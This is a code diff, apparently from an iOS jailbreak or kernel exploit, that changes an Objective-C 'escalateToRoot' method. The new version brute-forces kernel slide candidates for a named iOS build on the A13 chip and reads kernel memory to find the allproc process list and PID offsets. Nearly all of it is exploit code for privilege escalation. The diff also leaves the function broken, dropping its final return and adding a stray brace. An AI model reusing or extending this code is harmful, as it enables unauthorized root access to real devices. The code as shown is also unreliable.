@@ -107,30 +107,33 @@ extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_siz
 }
 
 - (BOOL)escalateToRoot {
-    uint64_t slide = [self leakKernelSlide]; // 0xff7ffc000
-    // Offsets específicos para a seção DATA_CONST do iOS 26.3 (iPhone 11)
-    uint64_t base_tentativas[] = {0xA1F0000, 0xA210000, 0x9F50000, 0x8F50000};
+    [self logToWeb:@"🚀 Scanner de Slide Ativo..."];
+    
+    // Slides mais comuns para a Build 26.3 no A13
+    uint64_t slides_candidatos[] = {0x18400000, 0x1CC00000, 0x20400000, 0x15400000, 0x21000000};
+    uint64_t allproc_offset = 0x8F50000ULL; 
     uint64_t proc = 0;
 
-    for (int i = 0; i < 4; i++) {
-        // Tentamos a base 0x...07004000 e 0x...08004000
-        uint64_t ptr = (0xFFFFFFF007004000ULL + slide + base_tentativas[i]);
+    for (int i = 0; i < 5; i++) {
+        // Testando com a base de 16KB (0x...8000) que é o padrão do A13
+        uint64_t ptr = (0xFFFFFFF007008000ULL + slides_candidatos[i] + allproc_offset);
         proc = [self kread64:ptr];
         
-        [self logToWeb:[NSString stringWithFormat:@"🔍 Testando Offset 0x%llx -> Proc: 0x%llx", base_tentativas[i], proc]];
+        [self logToWeb:[NSString stringWithFormat:@"🎲 Slide 0x%llx -> Proc: 0x%llx", slides_candidatos[i], proc]];
 
         if (proc != 0 && (proc >> 40) >= 0xFFFFFF) {
-            [self logToWeb:@"🎯 ALLPROC LOCALIZADO!"];
+            [self logToWeb:@"🎯 SLIDE ENCONTRADO!"];
+            _kernelSlide = slides_candidatos[i];
             break;
         }
     }
 
     if (proc == 0) {
-        [self logToWeb:@"❌ Erro: AllProc não responde (0x0)."];
+        [self logToWeb:@"❌ Erro: Nenhum Slide/Base funcionou."];
         return NO;
     }
 
-    // --- TESTE FINAL DO PID (0x60 vs 0x68) ---
+    // --- AGORA SIM: TESTE DO PID (0x60 ou 0x68)
     while (proc != 0) {
         proc = (proc & 0x0000007FFFFFFFFFULL) | 0xFFFFFF8000000000ULL;
         
@@ -147,9 +150,8 @@ extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_siz
             return YES;
         }
         proc = [self kread64:(proc + 0x08)];
-    }
-    return NO;
-}
+    }}
+
 
 
 
